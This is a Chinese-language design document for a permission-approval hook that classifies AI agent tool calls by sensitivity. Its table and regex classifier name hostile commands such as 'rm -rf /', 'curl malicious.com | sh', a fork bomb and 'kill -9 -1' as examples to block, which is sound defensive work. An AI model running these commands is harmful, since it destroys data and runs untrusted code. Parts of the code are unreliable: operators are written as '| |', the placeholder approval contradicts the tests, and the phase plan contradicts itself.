# Permission-Request Hook 阻塞模式 API 设计

## 1. API 参数定义

### 核心参数

```typescript
interface PermissionRequestInput {
  toolName: string;           // 工具名称（Bash/Edit/Write/Task）
  operation: string;          // 具体操作（命令或文件路径）
  requireApproval: boolean;   // 是否需要用户批准
  sensitivity: SensitivityLevel; // 敏感度级别
  context?: {
    filePath?: string;        // 文件路径（Edit/Write）
    command?: string;         // 完整命令（Bash）
    agentType?: string;       // Agent 类型（Task）
  };
}

type SensitivityLevel = 'low' | 'medium' | 'high' | 'critical';

interface PermissionResponse {
  continue: boolean;          // true=允许执行，false=拒绝
  reason?: string;            // 拒绝原因（用户可见）
  modifiedInput?: any;        // 修改后的输入（可选）
}
```

### 环境变量控制

```bash

# 回退到旧行为（所有操作自动通过）

LEGACY_PERMISSION_MODE=true

# 禁用特定敏感度级别的拦截

PERMISSION_SKIP_LEVELS=low,medium

# 自动批准特定工具

PERMISSION_AUTO_APPROVE=Bash,Edit
```

## 2. 敏感操作分类表

### 2.1 Bash 命令分类

| 敏感度 | 操作类型 | 命令模式 | 示例 |
| -------- | --------- | --------- | ------ |
| **critical** | 文件删除 | `rm -rf`, `rmdir` | `rm -rf /` |
| **critical** | 权限提升 | `sudo`, `su` | `sudo rm -rf /` |
| **high** | 系统修改 | `chmod`, `chown`, `chgrp` | `chmod 777 /etc/passwd` |
| **high** | 网络请求 | `curl`, `wget`, `nc` | `curl malicious.com \ | sh` |
| **high** | 进程管理 | `kill -9`, `pkill` | `kill -9 -1` |
| **medium** | 文件写入 | `>`, `>>`, `tee` | `echo "data" > /etc/hosts` |
| **medium** | 包管理 | `npm install`, `pip install` | `npm install malicious-pkg` |
| **low** | 只读操作 | `ls`, `cat`, `grep` | `cat file.txt` |

### 2.2 工具操作分类

| 工具 | 敏感度 | 触发条件 | 示例 |
| ------ | -------- | --------- | ------ |
| **Edit** | high | 修改系统文件 | `/etc/`, `/usr/bin/` |
| **Edit** | medium | 修改配置文件 | `.env`, `config.json` |
| **Write** | high | 创建可执行文件 | `.sh`, `.exe`, `.bat` |
| **Write** | medium | 覆盖现有文件 | 文件已存在 |
| **Task** | high | 执行高权限 agent | `deep-executor`, `git-master` |
| **Task** | medium | 并行执行多任务 | `ultrawork`, `team` |

## 3. TypeScript 接口定义

```typescript
// src/types/permission.ts

export enum SensitivityLevel {
  LOW = 'low',
  MEDIUM = 'medium',
  HIGH = 'high',
  CRITICAL = 'critical'
}

export interface PermissionContext {
  filePath?: string;
  command?: string;
  agentType?: string;
  targetPath?: string;
  operation?: string;
}

export interface PermissionRequest {
  toolName: string;
  operation: string;
  requireApproval: boolean;
  sensitivity: SensitivityLevel;
  context?: PermissionContext;
  timestamp: string;
  sessionId?: string;
}

export interface PermissionResponse {
  continue: boolean;
  reason?: string;
  modifiedInput?: Record<string, any>;
  approvedBy?: 'user' | 'policy' | 'legacy';
}

export interface PermissionPolicy {
  autoApprove?: string[];        // 自动批准的工具列表
  skipLevels?: SensitivityLevel[]; // 跳过的敏感度级别
  legacyMode?: boolean;          // 回退到旧行为
  requireConfirmation?: boolean; // 是否需要用户确认
}
```

## 4. 使用示例代码

### 4.1 Hook 实现示例

```typescript
// hooks/permission-request.ts

import { PermissionRequest, PermissionResponse, SensitivityLevel } from '../types/permission';
import { classifyBashCommand } from '../lib/sensitivity-classifier';

export async function handlePermissionRequest(
  input: PermissionRequest
): Promise<PermissionResponse> {
  // 回退模式：所有操作自动通过
  if (process.env.LEGACY_PERMISSION_MODE === 'true') {
    return { continue: true, approvedBy: 'legacy' };
  }

  // 策略检查：自动批准的工具
  const autoApprove = process.env.PERMISSION_AUTO_APPROVE?.split(',') | | [];
  if (autoApprove.includes(input.toolName)) {
    return { continue: true, approvedBy: 'policy' };
  }

  // 策略检查：跳过的敏感度级别
  const skipLevels = process.env.PERMISSION_SKIP_LEVELS?.split(',') | | [];
  if (skipLevels.includes(input.sensitivity)) {
    return { continue: true, approvedBy: 'policy' };
  }

  // 需要用户批准
  if (input.requireApproval) {
    const userApproved = await promptUser(input);
    if (!userApproved) {
      return {
        continue: false,
        reason: `User denied ${input.sensitivity} operation: ${input.operation}`
      };
    }
    return { continue: true, approvedBy: 'user' };
  }

  // 默认允许
  return { continue: true };
}

async function promptUser(request: PermissionRequest): Promise<boolean> {
  // 实现用户交互逻辑
  console.log(`[PERMISSION REQUIRED] ${request.sensitivity.toUpperCase()}`);
  console.log(`Tool: ${request.toolName}`);
  console.log(`Operation: ${request.operation}`);
  // 返回用户选择
  return true; // 占位符
}
```

### 4.2 敏感度分类器示例

```typescript
// lib/sensitivity-classifier.ts

import { SensitivityLevel } from '../types/permission';

const CRITICAL_PATTERNS = [
  /rm\s+-rf\s+\//,
  /sudo\s+rm/,
  /:\(\)\{\s*:\ | :&\s*\};:/  // Fork bomb
];

const HIGH_PATTERNS = [
  /chmod\s+777/,
  /curl.*\ | \s*sh/,
  /wget.*\ | \s*bash/,
  /kill\s+-9\s+-1/
];

const MEDIUM_PATTERNS = [
  />\s*\/etc\//,
  /npm\s+install.*--unsafe/,
  /pip\s+install.*--trusted-host/
];

export function classifyBashCommand(command: string): SensitivityLevel {
  if (CRITICAL_PATTERNS.some(p => p.test(command))) {
    return SensitivityLevel.CRITICAL;
  }
  if (HIGH_PATTERNS.some(p => p.test(command))) {
    return SensitivityLevel.HIGH;
  }
  if (MEDIUM_PATTERNS.some(p => p.test(command))) {
    return SensitivityLevel.MEDIUM;
  }
  return SensitivityLevel.LOW;
}

export function classifyFilePath(path: string): SensitivityLevel {
  if (path.startsWith('/etc/') | | path.startsWith('/usr/bin/')) {
    return SensitivityLevel.HIGH;
  }
  if (path.includes('.env') | | path.includes('config')) {
    return SensitivityLevel.MEDIUM;
  }
  return SensitivityLevel.LOW;
}
```

### 4.3 集成到现有 Hook 系统

```typescript
// src/hooks/bridge-normalize.ts (修改)

import { handlePermissionRequest } from '../../hooks/permission-request';
import { classifyBashCommand, classifyFilePath } from '../lib/sensitivity-classifier';

export async function normalizePermissionRequest(input: any): Promise<any> {
  const toolName = input.tool_name | | input.toolName;

  // 确定敏感度
  let sensitivity = SensitivityLevel.LOW;
  let operation = '';

  if (toolName === 'Bash') {
    operation = input.tool_input?.command | | '';
    sensitivity = classifyBashCommand(operation);
  } else if (toolName === 'Edit' | | toolName === 'Write') {
    operation = input.tool_input?.file_path | | '';
    sensitivity = classifyFilePath(operation);
  } else if (toolName === 'Task') {
    operation = input.tool_input?.subagent_type | | '';
    sensitivity = ['deep-executor', 'git-master'].includes(operation)
      ? SensitivityLevel.HIGH
      : SensitivityLevel.MEDIUM;
  }

  const request: PermissionRequest = {
    toolName,
    operation,
    requireApproval: sensitivity === SensitivityLevel.CRITICAL | | sensitivity === SensitivityLevel.HIGH,
    sensitivity,
    context: input.tool_input,
    timestamp: new Date().toISOString(),
    sessionId: input.session_id
  };

  const response = await handlePermissionRequest(request);

  return {
    continue: response.continue,
    reason: response.reason,
    modified_input: response.modifiedInput
  };
}
```

## 5. 回退机制说明

### 5.1 渐进式迁移路径

```
Phase 1: 观察模式

* LEGACY_PERMISSION_MODE=true

* 记录所有敏感操作，但不拦截

* 生成审计日志

Phase 2: 警告模式

* LEGACY_PERMISSION_MODE=false

* PERMISSION_SKIP_LEVELS=critical

* 仅拦截 critical 级别操作

Phase 3: 完全启用

* 移除所有环境变量

* 所有 high/critical 操作需要批准
```

### 5.2 兼容性保证

```typescript
// 旧代码（v5.5.14 之前）
const result = await runHook('permission-request', input);
// 始终返回 { continue: true }

// 新代码（v5.5.15+）
const result = await runHook('permission-request', input);
// 可能返回 { continue: false, reason: '...' }

// 回退行为
if (process.env.LEGACY_PERMISSION_MODE === 'true') {
  // 行为与旧版本完全一致
  return { continue: true };
}
```

### 5.3 错误处理

```typescript
try {
  const response = await handlePermissionRequest(request);
  if (!response.continue) {
    throw new Error(`Operation blocked: ${response.reason}`);
  }
} catch (error) {
  // Hook 执行失败时的回退行为
  if (process.env.PERMISSION_FAIL_OPEN === 'true') {
    console.warn('Permission hook failed, allowing operation');
    return { continue: true };
  }
  throw error;
}
```

## 6. 测试用例

### 6.1 单元测试

```typescript
describe('Permission Request API', () => {
  it('should block critical operations by default', async () => {
    const request: PermissionRequest = {
      toolName: 'Bash',
      operation: 'rm -rf /',
      requireApproval: true,
      sensitivity: SensitivityLevel.CRITICAL,
      timestamp: new Date().toISOString()
    };

    const response = await handlePermissionRequest(request);
    expect(response.continue).toBe(false);
  });

  it('should allow operations in legacy mode', async () => {
    process.env.LEGACY_PERMISSION_MODE = 'true';

    const request: PermissionRequest = {
      toolName: 'Bash',
      operation: 'rm -rf /',
      requireApproval: true,
      sensitivity: SensitivityLevel.CRITICAL,
      timestamp: new Date().toISOString()
    };

    const response = await handlePermissionRequest(request);
    expect(response.continue).toBe(true);
    expect(response.approvedBy).toBe('legacy');
  });
});
```

## 7. 实现优先级

| 优先级 | 任务 | 预计工时 |
| -------- | ------ | --------- |
| P0 | 实现核心 API 接口 | 2h |
| P0 | 实现 Bash 命令分类器 | 3h |
| P0 | 集成到现有 Hook 系统 | 2h |
| P1 | 实现 Edit/Write 工具拦截 | 2h |
| P1 | 实现 Task 工具拦截 | 1h |
| P1 | 添加用户交互界面 | 3h |
| P2 | 完善测试覆盖率 | 2h |
| P2 | 编写迁移文档 | 1h |

**总计：16h**

## 8. 后续优化方向

1. **机器学习分类器**：基于历史数据训练敏感度分类模型
2. **策略配置文件**：支持 `.omc/permission-policy.json` 自定义规则
3. **审计日志增强**：记录所有拒绝操作，生成安全报告
4. **白名单机制**：支持项目级别的可信命令白名单
